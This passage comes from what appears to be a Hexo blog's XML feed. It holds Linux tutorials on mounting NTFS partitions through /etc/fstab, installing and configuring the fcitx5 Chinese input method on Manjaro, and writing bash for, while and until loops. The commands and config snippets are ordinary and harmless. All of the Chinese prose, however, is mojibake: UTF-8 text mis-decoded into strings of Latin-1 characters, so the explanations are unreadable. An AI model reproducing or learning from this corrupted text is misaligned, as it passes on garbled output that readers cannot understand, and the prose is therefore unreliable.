data</span><br></pre></td></tr></table></figure></p><p>ä¾‹å¦‚ï¼šæˆ‘è¦æŒ‚è½½<code>/dev/sdb1</code>ã€<code>/dev/sdb2</code></p></li><li><p>è®°ä½åœ¨ Windows ä¸Šå¯¹åº”è¯¥åˆ†åŒºçš„åå­— ä¾‹å¦‚ï¼šä¸Šé¢ä¸¤ä¸ªå«åš<code>notesï¼Œsoftware</code></p></li><li><p>ä¿®æ”¹ fstab</p><p><code>sudo vim /etc/fstab</code></p><p>æŒ‰ç…§å¯¹åº”æ ¼å¼åœ¨æ–‡ä»¶æœ«å°¾åŠ ä¸Šæœ€åå››å¥ï¼Œå…¶ä¸­ <code>&lt;dir&gt;</code>å­—æ®µæ ¹æ®è‡ªå·±çš„ç»å¯¹è·¯å¾„å†™</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/fstab</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Static information about the filesystems.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">See fstab(5) <span class="keyword">for</span> details.</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;file system&gt; &lt;<span class="built_in">dir</span>&gt; &lt;<span class="built_in">type</span>&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/dev/sda5</span></span><br><span class="line">UUID=49ab84d9-8361-46f4-8f68-a18201dc105d       /               ext4            rw,relatime     0 1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/dev/sda1</span></span><br><span class="line">UUID=34DB-E5F7          /boot/efi       vfat            rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=iso8859-1,shortname=mixed,utf8,errors=remount-ro       0 2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/dev/sda4</span></span><br><span class="line">UUID=236b02b4-f6b4-46ce-90c6-fff28b4a7a31       none            swap            defaults        0 0</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/dev/sdb1</span></span><br><span class="line">/dev/sdb1               /run/media/realyee/notes       ntfs-3g         defaults        0       0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/dev/sdb2</span></span><br><span class="line">/dev/sdb2               /run/media/realyee/software    ntfs-3g         defaults        0       0</span><br></pre></td></tr></table></figure></p></li><li><p>å®Œæˆï¼Œä»¥åå¼€æœºè‡ªåŠ¨æŒ‚è½½</p></li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><a href="https://wiki.archlinux.org/index.php/Fstab">arch_wikifstab</a></li><li><a href="https://wiki.archlinux.org/index.php/bluetooth">arch_wikibluetooth</a></li><li><ahref="https://wiki.archlinux.org/index.php/Bluetooth_headset#Headset_via_Bluez5/PulseAudio">arch_wikiBluetooth headset</a></li><li><ahref="https://wiki.archlinux.org/index.php/Archiving_and_compression">Archivingand compression</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> arch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fcitx5ã€è¾“å…¥æ³•ã€è¯åº“å®‰è£…é…ç½®</title>
      <link href="/blog/2020/08/07/linux/manjaro/fcitx5/"/>
      <url>/blog/2020/08/07/linux/manjaro/fcitx5/</url>
      
        <content type="html"><![CDATA[<h2 id="å¸è½½-fcitx4">å¸è½½ Fcitx4</h2><p>é¦–å…ˆæŠŠå¸è½½ç³»ç»Ÿä¸­ fcitx4 ç›¸å…³åŒ…:</p><p><code>sudo pacman -Rs $(pacman -Qsq fcitx)</code></p><h2 id="å®‰è£…-fcitx5">å®‰è£… fcitx5</h2><p>ä»¥ä¸‹å®‰è£…äºŒé€‰ä¸€ï¼Œåˆ‡å¿Œå¸¦ <code>-git</code> åç¼€çš„å’Œä¸å¸¦<code>-git</code> çš„åŒ…ä¸€èµ·å®‰è£…ï¼ˆå½“ç„¶ï¼Œä¸€äº›è¯åº“å•¥çš„æ²¡äº‹ï¼‰ã€‚</p><p>ç¨³å¥å®‰è£…ï¼ˆå®‰è£… community æºçš„ fcitx5ï¼‰ï¼š</p><p><code>sudo pacman -S fcitx5-chinese-addons fcitx5 fcitx5-gtk fcitx5-qt kcm-fcitx5</code></p><p>æ³¨æ„ï¼š<code>kcm-fcitx5</code> ä¸º KDE æ¡Œé¢çš„å›¾å½¢åŒ–é…ç½® fcitx5 åŒ…ã€‚</p><p>æ¿€è¿›å®‰è£…ï¼ˆarchlinuxcn æºçš„ fcitx5ï¼‰:</p><p><code>yay -S fcitx5-chinese-addons-git fcitx5-configtool-git fcitx5-git fcitx5-gtk-git fcitx5-qt5-git fcitx5-pinyin-zhwiki</code></p><p>fcitx5: è¾“å…¥æ³•åŸºç¡€æ¡†æ¶ä¸»ç¨‹åº fcitx5-chinese-addons:ç®€ä½“ä¸­æ–‡è¾“å…¥çš„æ”¯æŒï¼Œäº‘æ‹¼éŸ³ fcitx5-gtk: GTK ç¨‹åºçš„æ”¯æŒ fcitx5-qt: QT5ç¨‹åºçš„æ”¯æŒ fcitx5-pinyin-zhwiki: è‚¥çŒ«åˆ¶ä½œçš„ç»´åŸºç™¾ä¸‡è¯åº“ï¼Œæ²¡æœ‰ç‰ˆæƒé£é™©,æ”¾å¿ƒä½¿ç”¨ kcm-fcitx5: KDE æ¡Œé¢ç¯å¢ƒçš„æ”¯æŒï¼Œæœ€è¿‘æ¢ä¸ºäº†<code>fcitx5-configtool-git</code>ï¼Œ manjaroè¿˜æ²¡æ›´æ–°åˆ°ï¼Œä¸è¿‡å¯ä»¥æ‰‹åŠ¨å®‰è£…ã€‚</p><h2 id="è®¾ç½®-fcitx5-åˆå§‹é…ç½®">è®¾ç½® Fcitx5 åˆå§‹é…ç½®</h2><p>é…ç½® Group ç›´æ¥å¯åŠ¨ fcitx5 æ˜¯åªæœ‰è¥¿æ–‡é”®ç›˜çš„ï¼Œå¦‚æœæ˜¯KDEï¼Œå¯ä»¥åˆ°ç³»ç»Ÿçš„è¾“å…¥æ³•é…ç½®å¯ç”¨æ‹¼éŸ³ã€‚å¦‚æœæ˜¯åˆ«çš„æ¡Œé¢çš„è¯ï¼ŒæŠŠä¸‹é¢çš„å†…å®¹ç²˜è´´åˆ°<code>~/.config/fcitx5/profile</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[Groups/0]</span><br><span class="line"># Group Name</span><br><span class="line">Name=Default</span><br><span class="line"># Layout</span><br><span class="line">Default Layout=us</span><br><span class="line"># Default Input Method</span><br><span class="line">DefaultIM=pinyin</span><br><span class="line"></span><br><span class="line">[Groups/0/Items/0]</span><br><span class="line"># Name</span><br><span class="line">Name=keyboard-us</span><br><span class="line"># Layout</span><br><span class="line">Layout=</span><br><span class="line"></span><br><span class="line">[Groups/0/Items/1]</span><br><span class="line"># Name</span><br><span class="line">Name=pinyin</span><br><span class="line"># Layout</span><br><span class="line">Layout=</span><br><span class="line"></span><br><span class="line">[GroupOrder]</span><br><span class="line">0=Default</span><br></pre></td></tr></table></figure><p><code>DefaultIM=xx</code> ä¸ºè®¾ç½®é»˜è®¤è¾“å…¥æ³•ï¼Œå¦‚æœä½ ä¹ æƒ¯ä½¿ç”¨rime,åé¢å®‰è£…å¥½ä¹‹åå¯ä»¥è®¾ç½®æˆ rimeã€‚</p><p>é…ç½®æ–‡ä»¶åœ¨æ³¨é”€é‡æ–°ç™»é™†ä¹‹åå°±ä¼šç”Ÿæ•ˆï¼Œå±Šæ—¶å¯åŠ¨ fcitx5 å³å¯ä½“éªŒã€‚</p><h3 id="é…ç½®ç¯å¢ƒå˜é‡">é…ç½®ç¯å¢ƒå˜é‡</h3><p>ä¿®æ”¹ <code>~/.pam_environment</code>ï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GTK_IM_MODULE=fcitx5</span><br><span class="line">QT_IM_MODULE=fcitx5</span><br><span class="line">XMODIFIERS=&quot;@im=fcitx5&quot;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>echo $&#123;XDG_SESSION_TYPE&#125;</code> å‘½ä»¤æŸ¥çœ‹ï¼Œå¦‚æœæ˜¯ x11ç”¨æˆ·ï¼Œåˆ™è¿˜åº”å½“åœ¨<code>~/.xprofile</code>æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š<code>fcitx5 &amp;</code></p><h2 id="fcitx5-rime">fcitx5-rime</h2><p><code>sudo pacman -S fcitx5-rime fcitx5-pinyin-zhwiki-rime</code>æˆ–è€… <code>yay -S fcitx5-rime-git fcitx5-pinyin-zhwiki-rime</code></p><p>æ–°ç‰ˆå…¼å®¹æ—§ç‰ˆé…ç½®ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨å‘½ä»¤å¤åˆ¶é…ç½®ä¸è¯åº“ï¼š<code>cp -r ~/.config/fcitx/rime ~/.local/share/fcitx5/rime</code></p><h2 id="ä¸ªæ€§åŒ–">ä¸ªæ€§åŒ–</h2><h3 id="å…³é—­äº‘æ‹¼éŸ³">å…³é—­äº‘æ‹¼éŸ³</h3><p>ä¿®æ”¹ <code>~/.config/fcitx5/conf/pinyin.conf</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Enable Cloud Pinyin</span><br><span class="line">CloudPinyinEnabled=False</span><br></pre></td></tr></table></figure><h3 id="å…³é—­è‡ªåŠ¨-dpi">å…³é—­è‡ªåŠ¨ DPI</h3><p>fcitx5 ä¼šè‡ªåŠ¨æ ¹æ®å¤šæ˜¾ç¤ºå™¨ä¸åŒçš„ DPIæ¥è°ƒæ•´ç•Œé¢å¤§å°ï¼Œä½†å¯èƒ½ä¼šé€ æˆäº†ä¸€äº›å›°æ‰°ï¼Œå°†è¿™ä¸€åŠŸèƒ½å…³é—­ï¼Œå¹¶è°ƒæ•´å­—ä½“å¤§å°ä¸º14ã€‚</p><p>ä¿®æ”¹<code>~/.config/fcitx5/conf/classicui.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># æŒ‰å±å¹• DPI ä½¿ç”¨</span><br><span class="line">PerScreenDPI=False</span><br><span class="line"></span><br><span class="line"># Font (è®¾ç½®æˆä½ å–œæ¬¢çš„å­—ä½“)</span><br><span class="line">Font=&quot;Noto Sans Regular 14&quot;</span><br></pre></td></tr></table></figure><h3 id="è‡ªå®šä¹‰å¿«é€Ÿè¾“å…¥">è‡ªå®šä¹‰å¿«é€Ÿè¾“å…¥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#åœ¨ fcitx5 æ•°æ®æ–‡ä»¶å¤¹å»ºç«‹ mb æ–‡ä»¶</span><br><span class="line">sudo touch /usr/share/fcitx5/data/quickphrase.d/quick.mb</span><br><span class="line"># ä½¿ç”¨ vim ç¼–è¾‘è‡ªå®šä¹‰è¾“å…¥</span><br><span class="line">sudo vim /usr/share/fcitx5/data/quickphrase.d/quick.mb</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨æ–‡ä»¶ä¸­æ·»åŠ å½¢å¦‚<code>input output</code>çš„ä»£ç ï¼Œä¸€è¡Œä¸€æ¡ï¼Œå³å¯å®ç°æ·»åŠ å¿«é€Ÿè¾“å…¥è¾å…¸ã€‚</p><p>ç¤ºä¾‹ï¼šè¦åœ¨å¿«é€Ÿè¾“å…¥ä¸­è¾“å…¥<code>eg</code>ï¼Œåœ¨å€™é€‰ä¸­æ˜¾ç¤º<code>e.g.</code>ï¼Œåªéœ€åœ¨ä¸Šè¿°mb æ–‡ä»¶ä¸­æ·»åŠ ä¸€è¡Œ<code>eg e.g.</code>å³å¯ã€‚</p><p><em>å‹æƒ…æç¤ºï¼šå¿«é€Ÿè¾“å…¥å¯ä»¥ä½¿ç”¨åˆ†å·æ‰“å¼€ï¼ŒRimeä¸æ”¯æŒå¿«é€Ÿè¾“å…¥ã€‚</em></p><h2 id="çš®è‚¤">çš®è‚¤</h2><p><ahref="https://github.com/hosxy/fcitx5-dark-transparent">fcitx5-dark-transparent</a></p><h3 id="ç”¨å•è¡Œæ¨¡å¼inline_preedit">ç”¨å•è¡Œæ¨¡å¼(inline_preedit)</h3><p>ä¸Šå›¾å°±æ˜¯å•è¡Œæ¨¡å¼ï¼Œéå¸¸å¥½çœ‹ï¼Œæ¨èå¼€å¯</p><p>å¯¹äº fcitx5 è‡ªå¸¦ pinyin è¯·ä¿®æ”¹<code>~/.config/fcitx5/conf/pinyin.conf</code></p><p>å¯¹äº fcitx5-rimeï¼Œè¯·æ–°å»º/ä¿®æ”¹<code>~/.config/fcitx5/conf/rime.conf</code></p><p>åŠ å…¥/ä¿®æ”¹ä»¥ä¸‹å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># å¯ç”¨æ—¶åœ¨åº”ç”¨ç¨‹åºä¸­æ˜¾ç¤ºé¢„ç¼–è¾‘æ–‡æœ¬</span><br><span class="line">PreeditInApplication=True</span><br></pre></td></tr></table></figure><blockquote><p>è¾“å…¥æ³•é…ç½®å®Œæˆåï¼Œå¦‚æœæ²¡æœ‰è¾¾åˆ°åº”è¯¥è¾¾åˆ°çš„æ•ˆæœï¼Œå»ºè®®å…ˆé‡å¯ fcitx5 æˆ–è€…logout æˆ–è€…é‡å¯ç”µè„‘ï¼Œä»¥ä¾¿é…ç½®ç”Ÿæ•ˆã€‚</p></blockquote><h2 id="å‚è€ƒæ•™ç¨‹">å‚è€ƒæ•™ç¨‹</h2><blockquote><ol type="1"><li><a href="https://www.wannaexpresso.com/2020/03/26/fcitx5/">åœ¨Manjaro ä¸Šä¼˜é›…åœ°ä½¿ç”¨ Fcitx5 å« fcitx5+rime</a></li><li><ahref="https://manateelazycat.github.io/linux/2020/06/19/fcitx5-is-awesome.html">é…ç½®Fcitx5 è¾“å…¥æ³•, è‚¥çŒ«ç™¾ä¸‡è¯åº“å°±æ˜¯èµ</a></li><li><ahref="https://github.com/hosxy/fcitx5-dark-transparent">fcitx5-dark-transparent</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> manjaro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell å¾ªç¯</title>
      <link href="/blog/2020/08/03/programming/shell/7.loop/"/>
      <url>/blog/2020/08/03/programming/shell/7.loop/</url>
      
        <content type="html"><![CDATA[<h2 id="for-å¾ªç¯">for å¾ªç¯</h2><p>bash shell ä¸­ for å‘½ä»¤çš„åŸºæœ¬æ ¼å¼ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for var in list; do</span><br><span class="line">    commands</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>åœ¨ commands ä¸­ï¼Œ <code>$var</code>å˜é‡åŒ…å«ç€è¿™æ¬¡è¿­ä»£å¯¹åº”çš„å½“å‰åˆ—è¡¨é¡¹ä¸­çš„å€¼ã€‚ åœ¨ listå‚æ•°ä¸­ï¼Œä½ éœ€è¦æä¾›è¿­ä»£ä¸­è¦ç”¨åˆ°çš„ä¸€ç³»åˆ—å€¼ã€‚å¯ä»¥é€šè¿‡å‡ ç§ä¸åŒçš„æ–¹æ³•æŒ‡å®šåˆ—è¡¨ä¸­çš„å€¼ã€‚ä¸‹é¢ä»‹ç»å‡ ç§æ–¹å¼</p><h3 id="è¯»å–åˆ—è¡¨ä¸­çš„å€¼">è¯»å–åˆ—è¡¨ä¸­çš„å€¼</h3><p>for å‘½ä»¤æœ€åŸºæœ¬çš„ç”¨æ³•å°±æ˜¯éå† forå‘½ä»¤è‡ªèº«æ‰€å®šä¹‰çš„ä¸€ç³»åˆ—å€¼ã€‚<strong>forå¾ªç¯å‡å®šæ¯ä¸ªå€¼éƒ½æ˜¯ç”¨ç©ºæ ¼åˆ†å‰²çš„.</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for name in xiaoming zhangsan lisi wangwu</span><br><span class="line">do</span><br><span class="line">    echo &quot;the name is &quot; $name</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªæ³¨æ„äº‹é¡¹ï¼š</p><ol type="1"><li><p>åˆ—è¡¨å€¼ä¸­æœ‰å•å¼•å·</p><p>shellçœ‹åˆ°äº†<strong>åˆ—è¡¨å€¼ä¸­çš„å•å¼•å·</strong>å¹¶å°è¯•ä½¿ç”¨å®ƒä»¬æ¥å®šä¹‰ä¸€ä¸ªå•ç‹¬çš„æ•°æ®å€¼</p><p>è§£å†³æ–¹æ³•ï¼š</p><ol type="1"><li>ä½¿ç”¨ <code>\</code>å¯¹å•å¼•å·è¿›è¡Œè½¬ä¹‰</li><li>ä½¿ç”¨åŒå¼•å·å°†è¯¥åˆ—è¡¨å€¼æ‹¬èµ·æ¥ åœ¨æŸä¸ªå€¼ä¸¤è¾¹ä½¿ç”¨åŒå¼•å·æ—¶ï¼Œshellå¹¶ä¸ä¼šå°†åŒå¼•å·å½“æˆå€¼çš„ä¸€éƒ¨åˆ†ã€‚</li></ol></li><li><p>åˆ—è¡¨å€¼ä¸­å«æœ‰ç©ºæ ¼</p><p>è§£å†³æ–¹æ³•ï¼šä½¿ç”¨åŒå¼•å·å°†è¯¥åˆ—è¡¨å€¼æ‹¬èµ·æ¥</p></li></ol><h3 id="ä»å˜é‡è¯»å–åˆ—è¡¨">ä»å˜é‡è¯»å–åˆ—è¡¨</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> test.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">list=&quot;item1 item2 item3&quot;</span><br><span class="line">list=$list&quot; item4&quot;</span><br><span class="line">for item in $list</span><br><span class="line">do</span><br><span class="line">    echo &quot;this is $item&quot;</span><br><span class="line">done</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/codespace/sh_test [21:38:43]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./test.sh</span></span><br><span class="line">this is item1</span><br><span class="line">this is item2</span><br><span class="line">this is item3</span><br><span class="line">this is item4</span><br></pre></td></tr></table></figure><p><code>$list</code>å˜é‡åŒ…å«äº†ç”¨äºè¿­ä»£çš„æ ‡å‡†æ–‡æœ¬å€¼åˆ—è¡¨ã€‚ä»£ç è¿˜ç”¨äº†å¦ä¸€ä¸ªèµ‹å€¼è¯­å¥å‘<code>$list</code>å˜é‡åŒ…å«çš„å·²æœ‰åˆ—è¡¨ä¸­æ·»åŠ ï¼ˆæˆ–è€…è¯´æ˜¯æ‹¼æ¥ï¼‰äº†ä¸€ä¸ªå€¼ã€‚è¿™æ˜¯å‘å˜é‡ä¸­å­˜å‚¨çš„å·²æœ‰æ–‡æœ¬å­—ç¬¦ä¸²å°¾éƒ¨æ·»åŠ æ–‡æœ¬çš„ä¸€ä¸ªå¸¸ç”¨æ–¹æ³•ã€‚</p><h3 id="ä»å‘½ä»¤è¯»å–å€¼">ä»å‘½ä»¤è¯»å–å€¼</h3><p>ç»“åˆå‘½ä»¤æ›¿æ¢ï¼Œä»éå†å‘½ä»¤çš„ç»“æœ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for i in $(ls ~);do</span><br><span class="line">    echo &quot;$i&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h3 id="ç”Ÿæˆåºåˆ—">ç”Ÿæˆåºåˆ—</h3><h4 id="åºåˆ—è¡¨è¾¾å¼">åºåˆ—è¡¨è¾¾å¼</h4><p>åºåˆ—è¡¨è¾¾å¼æ˜¯èŠ±æ‹¬å·å±•å¼€(brace expansion)ç‰¹æ€§çš„ä¸€ä¸ªåŠŸèƒ½ã€‚</p><p>åºåˆ—è¡¨è¾¾å¼çš„è¯­æ³•æ˜¯ï¼š<code>&#123;&lt;START&gt;..&lt;END&gt;[..&lt;INCR&gt;]&#125;</code></p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;a..g&#125;;do</span><br><span class="line">    echo $i</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h4 id="seq">seq</h4><p><code>seq</code> å‘½ä»¤ç”¨æ¥ç”Ÿæˆåºåˆ—ï¼š</p><blockquote><p>NAME seq - print a sequence of numbers</p><p>SYNOPSIS seq [OPTION]... LAST seq [OPTION]... FIRST LAST seq[OPTION]... FIRST INCREMENT LAST</p></blockquote><h4 id="é¢˜ç›®ä¸é¢˜è§£">é¢˜ç›®ä¸é¢˜è§£</h4><p>é¢˜ç›®ï¼š<ahref="https://www.hackerrank.com/challenges/bash-tutorials---looping-and-skipping/problem?h_r=next-challenge&amp;h_v=zen">Loopingand Skipping</a></p><h4 id="é¢˜è§£">é¢˜è§£</h4><p>æ€è·¯æ˜¯ç›´æ¥ç”Ÿæˆè·³è¿‡å¶æ•°çš„åºåˆ—ã€‚å½“ç„¶ï¼Œç›´æ¥ç”Ÿæˆå…¨åºåˆ—ï¼Œç„¶ååˆ¤æ–­ä¹Ÿå¯ã€‚</p><ol type="1"><li><p>èŠ±æ‹¬å·æ‰©å±•çš„åºåˆ—ç”Ÿæˆè¡¨è¾¾å¼(æœ€ä½³)</p><p>Using in-built ranges (like for x in {1..99..2}) is much faster.</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for num in &#123;1..99..2&#125;;do</span><br><span class="line">    echo $num</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p><p>Note that <strong>bash doesn't support variables in brace rangeexpansions.</strong></p><p>é¢˜ç›®ç»ƒä¹ ï¼š<ahref="https://www.hackerrank.com/challenges/bash-tutorials---compute-the-average/problem">Computethe Average</a></p></li><li><p><code>seq</code> ç”Ÿæˆåºåˆ—</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for num in $(seq 1 2 99);do</span><br><span class="line">    echo $num</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p></li><li><p>å…¨åºåˆ—ï¼Œåˆ¤æ–­</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for i in &#123;1..99&#125;; do</span><br><span class="line">    if test $(expr $i % 2) -ne 0; then</span><br><span class="line">        echo $i</span><br><span class="line">    fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p></li></ol><h3 id="ç”¨é€šé…ç¬¦è¯»å–ç›®å½•">ç”¨é€šé…ç¬¦è¯»å–ç›®å½•</h3><p>è¿›è¡Œæ­¤æ“ä½œæ—¶ï¼Œå¿…é¡»åœ¨æ–‡ä»¶åæˆ–è·¯å¾„åä¸­ä½¿ç”¨é€šé…ç¬¦ã€‚å®ƒä¼šå¼ºåˆ¶ shellä½¿ç”¨æ–‡ä»¶æ‰©å±•åŒ¹é…ã€‚æ–‡ä»¶æ‰©å±•åŒ¹é…æ˜¯ç”ŸæˆåŒ¹é…æŒ‡å®šé€šé…ç¬¦çš„æ–‡ä»¶åæˆ–è·¯å¾„åçš„è¿‡ç¨‹ã€‚å¦‚æœä¸çŸ¥é“æ‰€æœ‰çš„æ–‡ä»¶åï¼Œè¿™ä¸ªç‰¹æ€§åœ¨å¤„ç†ç›®å½•ä¸­çš„æ–‡ä»¶æ—¶å°±éå¸¸å¥½ç”¨ã€‚</p><p>ä¾‹å¦‚ï¼š<code>for file in /home/rich/test/*</code></p><h3 id="c-è¯­è¨€é£æ ¼çš„-for-å‘½ä»¤">C è¯­è¨€é£æ ¼çš„ for å‘½ä»¤</h3><p>C è¯­è¨€é£æ ¼çš„ forå‘½ä»¤ä¹Ÿå…è®¸ä¸ºè¿­ä»£ä½¿ç”¨å¤šä¸ªå˜é‡ã€‚å¾ªç¯ä¼šå•ç‹¬å¤„ç†æ¯ä¸ªå˜é‡ï¼Œä½ å¯ä»¥ä¸ºæ¯ä¸ªå˜é‡å®šä¹‰ä¸åŒçš„è¿­ä»£è¿‡ç¨‹ã€‚å°½ç®¡å¯ä»¥ä½¿ç”¨å¤šä¸ªå˜é‡ï¼Œä½†ä½ åªèƒ½åœ¨for å¾ªç¯ä¸­å®šä¹‰ä¸€ç§æ¡ä»¶ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for (( variable assignment ; condition ; iteration process )); do</span><br><span class="line">    commands</span><br><span class="line">done</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for (( i=1; i &lt;= 10; i++ ))</span><br><span class="line">do</span><br><span class="line"> echo &quot;The next number is $i&quot;</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">for (( a=1, b=10; a &lt;= 10; a++, b-- ))</span><br><span class="line">do</span><br><span class="line"> echo &quot;$a - $b&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h2 id="while">while</h2><p>æ ¼å¼ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while test command</span><br><span class="line">do</span><br><span class="line"> other commands</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>while å‘½ä»¤ä¸­å®šä¹‰çš„ test command å’Œ if-thenè¯­å¥ä¸­çš„æ ¼å¼ä¸€æ¨¡ä¸€æ ·ã€‚æœ€å¸¸è§çš„ test commandçš„ç”¨æ³•æ˜¯ç”¨æ–¹æ‹¬å·æ¥æ£€æŸ¥å¾ªç¯å‘½ä»¤ä¸­ç”¨åˆ°çš„ shell å˜é‡çš„å€¼</p><h2 id="until">until</h2><p>untilå‘½ä»¤è¦æ±‚ä½ æŒ‡å®šä¸€ä¸ªé€šå¸¸è¿”å›éé›¶é€€å‡ºçŠ¶æ€ç çš„æµ‹è¯•å‘½ä»¤ã€‚åªæœ‰æµ‹è¯•å‘½ä»¤çš„é€€å‡ºçŠ¶æ€ç ä¸ä¸º0ï¼Œbash shell 